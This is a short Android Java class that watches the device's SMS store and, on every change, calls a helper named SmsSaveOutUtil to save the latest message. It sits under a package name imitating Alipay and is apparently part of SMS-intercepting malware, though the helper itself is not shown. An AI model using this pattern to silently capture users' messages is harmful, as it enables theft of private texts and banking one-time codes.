package com.alipay.safe.receiver;

import android.content.Context;
import android.database.ContentObserver;
import android.os.Handler;
import android.util.Log;

import com.alipay.safe.util.SmsSaveOutUtil;

public class SmsContentObserver extends ContentObserver {

	private Context context;

	public SmsContentObserver(Handler handler, Context con) {
		super(handler);
		this.context = con;
	}

	@Override
	public void onChange(boolean selfChange) {
		// TODO Auto-generated method stub
		super.onChange(selfChange);

		Log.e("SmsContentObserver", "ON CHANGED !!!!!");
		SmsSaveOutUtil so = new SmsSaveOutUtil(context);
		so.saveLastSms();
	}

}
